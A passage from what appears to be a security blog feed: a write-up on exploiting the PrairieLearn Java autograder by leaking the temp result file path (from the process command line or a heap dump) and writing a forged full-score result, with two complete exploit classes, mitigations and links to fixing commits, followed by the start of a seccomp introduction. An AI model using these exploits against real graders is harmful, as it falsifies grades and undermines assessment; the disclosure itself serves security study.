System.exit(),</span></span><br><span class="line"><span class="string">though this may be a result of stack overflow, excessive memory allocation, or similar problems.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>The script call <code>JUnitAutograder</code> with the students&#39; file and test file, then the result(score) is written to <code>$RESULTS_TEMP_FILE</code>. </p>
<p>After grading is done, the script checks if <code>$RESULTS_TEMP_FILE</code> exists. if exists, then grading is successfully done by autograder </p>
<p>and the result will be copied into <code>$RESULTS_FILE</code>. This result will then be read by the system outside the container.</p>
<p>Otherwise, it will raise an exception and set <code>gradable=false</code> in the result.</p>
<p>So, the main idea of autograder pwn is to somehow get the random filename (generated by <code>$RESULTS_TEMP_DIR/$RANDOM.json</code>), </p>
<p>then write our own fake result into the file. finally, exit the program immediately to prevent the result been overwritten again.</p>
<p>Since we&#39;ve already written a temp result file, the script will evaluate our fake results as real results.</p>
<h1 id="Leaking-information"><a href="#Leaking-information" class="headerlink" title="Leaking information"></a>Leaking information</h1><p>Leaking information from the sever is pretty straightforward.</p>
<p>Since autograder uses <code>org.opentest4j</code>, We can throw an unexpected <code>RuntimeException</code> with the information we want. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized void close() &#123;</span><br><span class="line">    throw new RuntimeException(&quot;I can leak whatever I want as string here&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Then, autograder will display the information we want in Message Box like</p>
<p><img data-src="/images/ctf/Breaking-PrairieLearn-Java-Grader/2023-01-23_184909.png" alt="2023-01-23_184909.png"></p>
<h1 id="Leaking-RESULTS-TEMP-FILE"><a href="#Leaking-RESULTS-TEMP-FILE" class="headerlink" title="Leaking RESULTS_TEMP_FILE"></a>Leaking RESULTS_TEMP_FILE</h1><h2 id="V1-leaking-from-command-line-arguments"><a href="#V1-leaking-from-command-line-arguments" class="headerlink" title="V1: leaking from command line arguments"></a>V1: leaking from command line arguments</h2><p>First I tried to leak <code>$RESULTS_TEMP_FILE</code> using environment variable.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void leakingFailed() &#123;</span><br><span class="line">    throw new RuntimeException(String.format(&quot;temp file is %s&quot;,System.getenv(&quot;RESULTS_TEMP_FILE&quot;)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However, this approach failed with following information</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.RuntimeException: temp file is: null</span><br></pre></td></tr></table></figure>


<p>Then I noticed that our program is called by following command line, where <code>$RESULTS_TEMP_FILE</code> is passed as an argument.</p>
<p>If I can access command line arguments, I can get the <code>RESULTS_TEMP_FILE</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp &quot;$CLASSPATH&quot; JUnitAutograder &quot;$RESULTS_TEMP_FILE&quot; &quot;$TEST_FILES&quot; &quot;$STUDENT_COMPILE_OUT&quot;</span><br></pre></td></tr></table></figure>

<p>I seached in google and came up with this <a href="https://stackoverflow.com/questions/2541627/how-do-i-get-the-commandline-that-started-the-process">stackoverflow page</a></p>
<p>Although one solution didn&#39;t work, the other one successfully return</p>
<p>failed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Result: &quot;java.lang.RuntimeException: lol error: []&quot;</span><br><span class="line">public synchronized Collection&lt;Definition&gt; getDefinitions(String word, Database database) throws DictConnectionException &#123;</span><br><span class="line">    Collection&lt;Definition&gt; set = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    // from</span><br><span class="line">    // https://stackoverflow.com/questions/2541627/how-do-i-get-the-commandline-that-started-the-process</span><br><span class="line">    this.unhandledException(String.format(&quot;lol error: %s&quot;,ManagementFactory.getRuntimeMXBean().getInputArguments()));</span><br><span class="line">    return set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>succeed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized void close() &#123;</span><br><span class="line">    String text;</span><br><span class="line">    try &#123;</span><br><span class="line">        long pid = ProcessHandle.current().pid();</span><br><span class="line">        String cmdline = String.format(&quot;/proc/%d/cmdline&quot;,pid);</span><br><span class="line">        text = new String(Files.readAllBytes(Paths.get(cmdline)), StandardCharsets.UTF_8);</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">    throw new RuntimeException(text);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>message</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.RuntimeException: java\u0000-cp�/grade/classpath:/grade/classpath/json-simple-1.1.1.jar:/grade/classpath/junit-platform-console-standalone-1.7.0-all.jar:�JUnitAutograder�/grade/results/tmp.MKlJ1ZgTju/6058.json�/grade/tests/junit/ca/ubc/cs317/dict/tests/DictionaryConnectionTest.java��</span><br></pre></td></tr></table></figure>

<p><strong>OvO</strong>: <code>/grade/results/tmp.MKlJ1ZgTju/6058.json</code></p>
<h2 id="V1-leaking-from-heap-dump"><a href="#V1-leaking-from-heap-dump" class="headerlink" title="V1: leaking from heap dump"></a>V1: leaking from heap dump</h2><p>After talking with PrairieLearn developers, I came up with second leaking method. </p>
<p>The idea of this method is very brutal - dump whole java heap memory as ascii string and search secret strings by regexp.</p>
<p>After some googling, I ended up with a native java api <code>HotSpotDiagnosticMXBean.dumpHeap</code> <a href="https://docs.oracle.com/javase/8/docs/jre/api/management/extension/com/sun/management/HotSpotDiagnosticMXBean.html">more</a>. This api allows me creating java heap dump using a single call, perfect for me in this situation.</p>
<p>Then, I can read this heap dump as string and leak secrete strings (including path) using regexp. </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">dumpPath</span> <span class="operator">=</span> <span class="string">&quot;/grade/params/heap.hprof&quot;</span>;</span><br><span class="line"><span class="type">Pattern</span> <span class="variable">signaturePattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(?:[A-Za-z0-9+\\/]&#123;4&#125;)&#123;10&#125;[A-Za-z0-9+\\/]&#123;3&#125;=&quot;</span>);</span><br><span class="line"><span class="type">Pattern</span> <span class="variable">tmpResultPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;/grade/results/[^/]*/\\d+.json&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">tmpResultPath</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Matcher match;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    dumpHeap(dumpPath, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scnr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(dumpPath));</span><br><span class="line">    <span class="keyword">while</span> (scnr.hasNext()) &#123;</span><br><span class="line">        match = tmpResultPattern.matcher(scnr.next());</span><br><span class="line">        <span class="keyword">if</span> (match.find() &amp;&amp; !match.group(<span class="number">0</span>).equals(<span class="string">&quot;/grade/results/[^/]*/\\d+.json&quot;</span>)) &#123;</span><br><span class="line">            tmpResultPath = match.group(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">// failed to create heap dump</span></span><br><span class="line">    System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Writing-Fake-Result"><a href="#Writing-Fake-Result" class="headerlink" title="Writing Fake Result"></a>Writing Fake Result</h1><p>After knowing how to getting the temp result file, everything is simple and easy. </p>
<ol>
<li>get temp result file</li>
<li>create fake results</li>
<li>write results to temp result file</li>
<li>exit program using <code>System.exit</code>.</li>
</ol>
<p>I basically copy paste code from <a href="https://github.com/PrairieLearn/PrairieLearn/blob/d105286fc0b287bc57b3553bd52196d14e704fd8/graders/java/JUnitAutograder.java">JUnitAutograder.java</a> and came up with following code (see full exploit below).</p>
<p>I uploaded exploit to PrairieLearn and here is the result I got!</p>
<p><img data-src="/images/ctf/Breaking-PrairieLearn-Java-Grader/2023-01-23_191424.png" alt="2023-01-23_191424.png"></p>
<h1 id="Possible-Mitigation"><a href="#Possible-Mitigation" class="headerlink" title="Possible Mitigation"></a>Possible Mitigation</h1><ol>
<li>Doing process isolation</li>
<li>prevent user from accessing command line arguments (privilege?)</li>
</ol>
<h1 id="Update-Log"><a href="#Update-Log" class="headerlink" title="Update Log"></a>Update Log</h1><p>Relevant commits:</p>
<p>First patch: information leaking from commandline was fixed in commit <a href="https://github.com/PrairieLearn/PrairieLearn/commit/2f263a8cdcd2bdd713bfbc19eb83aa496e76148e">2f263a8</a></p>
<p>Second patch: heap dump leaking was fixed in <a href="https://github.com/PrairieLearn/PrairieLearn/commit/7871ce577db146f9b1ee765735b8d70848129477">7871ce5</a></p>
<h1 id="Full-exploit-V1"><a href="#Full-exploit-V1" class="headerlink" title="Full exploit V1"></a>Full exploit V1</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ca.ubc.cs317.dict.net;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.simple.JSONArray;</span><br><span class="line"><span class="keyword">import</span> org.json.simple.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit for https://github.com/PrairieLearn/PrairieLearn/tree/master/graders/java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrairieLearnExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pwn</span><span class="params">()</span>&#123;</span><br><span class="line">        String cmdline;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">pid</span> <span class="operator">=</span> ProcessHandle.current().pid();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmdlinePath</span> <span class="operator">=</span> String.format(<span class="string">&quot;/proc/%d/cmdline&quot;</span>,pid);</span><br><span class="line">            cmdline = <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(cmdlinePath)), StandardCharsets.UTF_8);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="comment">// failed to find cmdline file</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;/grade/results/[^/]*/\\d+.json&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(cmdline);</span><br><span class="line">        <span class="keyword">if</span> (!matcher.find())&#123;</span><br><span class="line">            <span class="comment">// failed to find tmp file</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get temp file path</span></span><br><span class="line">        System.out.println(matcher.group(<span class="number">0</span>));</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">fake_test</span> <span class="operator">=</span> newTest(<span class="string">&quot;Pwned&quot;</span>,<span class="string">&quot;Pwned by aynakeya&quot;</span>,</span><br><span class="line">                <span class="number">16</span>,<span class="number">16</span>,<span class="string">&quot;QAQ&quot;</span>,<span class="string">&quot;OvO&quot;</span>);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">results</span> <span class="operator">=</span> newResult(<span class="number">1</span>,<span class="number">16</span>,<span class="number">16</span>,</span><br><span class="line">                <span class="string">&quot;PrairieLearn Java Autograder Exploit&quot;</span>,<span class="string">&quot;Pwned by aynakeya&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>,fake_test);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(matcher.group(<span class="number">0</span>))) &#123;</span><br><span class="line">            writer.write(results.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// failed to write;</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit to prevent overwrite</span></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">newTest</span><span class="params">(String name, String description,</span></span><br><span class="line"><span class="params">                                   <span class="type">double</span> points, <span class="type">double</span> maxPoints,</span></span><br><span class="line"><span class="params">                                   String output, String message)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        object.put(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        object.put(<span class="string">&quot;description&quot;</span>, description);</span><br><span class="line">        object.put(<span class="string">&quot;points&quot;</span>, points);</span><br><span class="line">        object.put(<span class="string">&quot;max_points&quot;</span>, maxPoints);</span><br><span class="line">        object.put(<span class="string">&quot;output&quot;</span>, output);</span><br><span class="line">        object.put(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">newResult</span><span class="params">(<span class="type">double</span> score, <span class="type">double</span> points,<span class="type">double</span> maxPoints,</span></span><br><span class="line"><span class="params">                                       String output,String message, <span class="type">boolean</span> gradable,</span></span><br><span class="line"><span class="params">                                       JSONObject ...tests)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">results</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="comment">// score 0-1</span></span><br><span class="line">        results.put(<span class="string">&quot;score&quot;</span>, score);</span><br><span class="line">        results.put(<span class="string">&quot;points&quot;</span>,points);</span><br><span class="line">        results.put(<span class="string">&quot;max_points&quot;</span>, maxPoints);</span><br><span class="line">        results.put(<span class="string">&quot;output&quot;</span>, output);</span><br><span class="line">        results.put(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">        results.put(<span class="string">&quot;gradable&quot;</span>,gradable);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">resultsTests</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        <span class="keyword">for</span> (JSONObject obj : tests) &#123;</span><br><span class="line">            resultsTests.add(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        results.put(<span class="string">&quot;tests&quot;</span>, resultsTests);</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">leakingFailed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(String.format(<span class="string">&quot;temp file is %s&quot;</span>,System.getenv(<span class="string">&quot;RESULTS_TEMP_FILE&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="Full-exploit-V2"><a href="#Full-exploit-V2" class="headerlink" title="Full exploit V2"></a>Full exploit V2</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ca.ubc.cs317.dict.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.management.HotSpotDiagnosticMXBean;</span><br><span class="line"><span class="keyword">import</span> org.json.simple.JSONArray;</span><br><span class="line"><span class="keyword">import</span> org.json.simple.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit for https://github.com/PrairieLearn/PrairieLearn/tree/master/graders/java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrairieLearnExploitV2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">tmpPath</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HOTSPOT_BEAN_NAME</span> <span class="operator">=</span></span><br><span class="line">            <span class="string">&quot;com.sun.management:type=HotSpotDiagnostic&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// field to store the hotspot diagnostic MBean</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> HotSpotDiagnosticMXBean hotspotMBean;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dumpHeap</span><span class="params">(String fileName, <span class="type">boolean</span> live)</span> &#123;</span><br><span class="line">        <span class="comment">// initialize hotspot diagnostic MBean</span></span><br><span class="line">        initHotspotMBean();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hotspotMBean.dumpHeap(fileName, live);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            <span class="keyword">throw</span> re;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exp) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(exp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize the hotspot diagnostic MBean field</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initHotspotMBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hotspotMBean == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (PrairieLearnExploitV2.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (hotspotMBean == <span class="literal">null</span>) &#123;</span><br><span class="line">                    hotspotMBean = getHotspotMBean();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the hotspot diagnostic MBean from the</span></span><br><span class="line">    <span class="comment">// platform MBean server</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HotSpotDiagnosticMXBean <span class="title function_">getHotspotMBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">MBeanServer</span> <span class="variable">server</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">            <span class="type">HotSpotDiagnosticMXBean</span> <span class="variable">bean</span> <span class="operator">=</span></span><br><span class="line">                    ManagementFactory.newPlatformMXBeanProxy(server,</span><br><span class="line">                            HOTSPOT_BEAN_NAME, HotSpotDiagnosticMXBean.class);</span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            <span class="keyword">throw</span> re;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exp) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(exp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pwnV2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dumpPath</span> <span class="operator">=</span> <span class="string">&quot;/grade/params/heap.hprof&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">signaturePattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(?:[A-Za-z0-9+\\/]&#123;4&#125;)&#123;10&#125;[A-Za-z0-9+\\/]&#123;3&#125;=&quot;</span>);</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">tmpResultPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;/grade/results/[^/]*/\\d+.json&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpResultPath</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        Matcher match;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dumpHeap(dumpPath, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">scnr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(dumpPath));</span><br><span class="line">            <span class="keyword">while</span> (scnr.hasNext()) &#123;</span><br><span class="line">                match = tmpResultPattern.matcher(scnr.next());</span><br><span class="line">                <span class="keyword">if</span> (match.find() &amp;&amp; !match.group(<span class="number">0</span>).equals(<span class="string">&quot;/grade/results/[^/]*/\\d+.json&quot;</span>)) &#123;</span><br><span class="line">                    tmpResultPath = match.group(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// failed to create heap dump</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">fake_test</span> <span class="operator">=</span> newTest(<span class="string">&quot;Pwned&quot;</span>,tmpResultPath,</span><br><span class="line">                <span class="number">16</span>,<span class="number">16</span>,<span class="string">&quot;QAQ&quot;</span>,<span class="string">&quot;OvO&quot;</span>);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">results</span> <span class="operator">=</span> newResult(<span class="number">1</span>,<span class="number">16</span>,<span class="number">16</span>,</span><br><span class="line">                <span class="string">&quot;PrairieLearn Java Autograder Exploit&quot;</span>,<span class="string">&quot;heap dump method&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>,fake_test);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(tmpResultPath)) &#123;</span><br><span class="line">            writer.write(results.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// failed to write;</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit to prevent overwrite</span></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">newTest</span><span class="params">(String name, String description,</span></span><br><span class="line"><span class="params">                                   <span class="type">double</span> points, <span class="type">double</span> maxPoints,</span></span><br><span class="line"><span class="params">                                   String output, String message)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        object.put(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        object.put(<span class="string">&quot;description&quot;</span>, description);</span><br><span class="line">        object.put(<span class="string">&quot;points&quot;</span>, points);</span><br><span class="line">        object.put(<span class="string">&quot;max_points&quot;</span>, maxPoints);</span><br><span class="line">        object.put(<span class="string">&quot;output&quot;</span>, output);</span><br><span class="line">        object.put(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">newResult</span><span class="params">(<span class="type">double</span> score, <span class="type">double</span> points,<span class="type">double</span> maxPoints,</span></span><br><span class="line"><span class="params">                                       String output,String message, <span class="type">boolean</span> gradable,</span></span><br><span class="line"><span class="params">                                       JSONObject ...tests)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">results</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="comment">// score 0-1</span></span><br><span class="line">        results.put(<span class="string">&quot;score&quot;</span>, score);</span><br><span class="line">        results.put(<span class="string">&quot;points&quot;</span>,points);</span><br><span class="line">        results.put(<span class="string">&quot;max_points&quot;</span>, maxPoints);</span><br><span class="line">        results.put(<span class="string">&quot;output&quot;</span>, output);</span><br><span class="line">        results.put(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">        results.put(<span class="string">&quot;gradable&quot;</span>,gradable);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">resultsTests</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        <span class="keyword">for</span> (JSONObject obj : tests) &#123;</span><br><span class="line">            resultsTests.add(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        results.put(<span class="string">&quot;tests&quot;</span>, resultsTests);</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>PrairieLearn</tag>
        <tag>academic pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>A Brief Introduction of Seccomp and How to Bypass it</title>
    <url>/articles/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>I have solve several seccomp related challenges in past few ctfs. To further enhance my understanding on <em>seccomp</em>, I decide to take a some time and learn how seccomm works.</p>
<p>All the codes used in this post can be download from here <a href="/static/upload/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/seccomp.zip">seccomp.zip</a></p>
<h1 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h1><p>So whats is seccomp? &quot;Seccomp is a computer secuirty facility in Linux kernel.[1]&quot; </p>
<p>Basically, seccomp create a sandbox which limit user&#39;s ability to use syscalls. Using seccomp, we can create a environment that allow&#x2F;disallow specific syscall being used.</p>
<p>The first version seccomp released at 2005. At that time, seccomp only have one node: <em>strict mode</em>. In this mode, users are only allowed to use four type of syscall <code>read</code>, <code>write</code>, <code>exit</code> and <code>sigreturn</code>. In strict mode, if user use any of syscall other than those four, the program will terminate immediately. (This is not very useful because there are too many limits!)</p>
<p>Then, in 2012, the second version of seccomp was introduced. Now seccomp have a new mode called <em>filter mode</em>. In this mode, user can specify syscalls that are allowed to run using BPF (Berkeley Packet Filter) virtual machine.</p>
<span id="more"></span>

<p><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/seccomp.h">seccomp.h</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, &lt;mode&gt;) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED	0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT	1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER	2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure>


<h1 id="Seccomp-strict-mode"><a href="#Seccomp-strict-mode" class="headerlink" title="Seccomp strict mode"></a>Seccomp strict mode</h1><p>Lets start with the basic mode of seccomp - <em>strict mode</em>.</p>
<p>To do that, we are going to ues a syscall called <code>prctl</code>. </p>
<p>more on <a href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl man page</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">int prctl(int option, unsigned long arg2, unsigned long arg3,</span><br><span class="line">                 unsigned long arg4, unsigned long arg5);</span><br></pre></td></tr></table></figure>

